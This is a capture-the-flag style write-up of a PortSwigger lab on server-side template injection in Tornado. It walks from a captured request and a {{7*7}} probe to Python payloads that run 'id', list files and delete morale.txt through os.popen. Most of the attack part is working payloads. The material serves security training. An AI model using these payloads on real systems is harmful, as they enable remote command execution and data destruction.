---
title: Basic server-side template injection (code context)
description: PortSwigger SSTI Lab
---
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Discovery
Login as `wiener:peter`, the user has a "Preferred name" functionality:
![](../../../../public/images/PS_SSTI_20250608%20_205907.png)
Preferred name request
```http
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0a0000c403f0e65f807b35b0006000d7.web-security-academy.net
Cookie: session=aYOwzuuc8FuNh3OpqpBIgoKjh4b7sOhO
Content-Length: 76
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Origin: https://0a0000c403f0e65f807b35b0006000d7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0000c403f0e65f807b35b0006000d7.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

blog-post-author-display=user.nickname&csrf=nCLI3F1butqYQwZOhvcoozamDDGpWSNT
```

Testing SSTI
```xml
blog-post-author-display={{7*7}}&csrf=nCLI3F1butqYQwZOhvcoozamDDGpWSNT
```

This sets the name that will be shown for the author when they post a comment.  The comment's author name shows the result of `7*7` which indicates that the `blog-post-author-display` parameter is vulnerable to SSTI.
![](../../../../public/images/PS_SSTI_20250608%20_210218.png)

Testing with python builtins
```xml
blog-post-author-display={{ [].__class__.__base__.__subclasses__() }}
&csrf=nCLI3F1butqYQwZOhvcoozamDDGpWSNT
```

That works:
![](../../../../public/images/PS_SSTI_20250608%20_210657.png)
```xml
blog-post-author-display={{ __import__('os').popen('id').read() }}
&csrf=nCLI3F1butqYQwZOhvcoozamDDGpWSNT
```
![](../../../../public/images/PS_SSTI_20250608%20_211021.png)
## Exploit

Listing the files

```python
{{ __import__('os').popen('ls').read() }}
```

![](../../../../public/images/PS_SSTI_20250608%20_211213@2x.png)

Removing the files
```python
{{ __import__('os').popen('rm morale.txt').read() }}
```

![](../../../../public/images/PS_SSTI_20250608%20_211333@2x.png)

List the directory and see that `morale.txt`  has been deleted:
![](../../../../public/images/PS_SSTI_20250608%20_211421@2x.png)